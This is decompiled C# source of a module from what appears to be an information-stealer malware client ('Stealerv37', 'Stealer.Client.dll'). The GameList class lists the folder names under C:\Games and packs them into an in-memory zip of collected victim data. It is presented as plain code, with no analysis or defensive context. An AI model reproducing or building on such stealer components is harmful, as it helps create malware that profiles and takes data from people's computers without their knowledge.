// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Device.GameList
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

#nullable disable
namespace Intelix.Targets.Device;

public class GameList : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = "C:\\Games";
    if (!Directory.Exists(path))
      return;
    // ISSUE: reference to a compiler-generated field
    // ISSUE: reference to a compiler-generated field
    List<string> list = ((IEnumerable<string>) Directory.GetDirectories(path)).Select<string, string>(GameList.\u003C\u003EO.\u003C0\u003E__GetFileName ?? (GameList.\u003C\u003EO.\u003C0\u003E__GetFileName = new Func<string, string>(Path.GetFileName))).ToList<string>();
    if (!list.Any<string>())
      return;
    zip.AddTextFile("Games.txt", string.Join("\n", (IEnumerable<string>) list));
  }
}
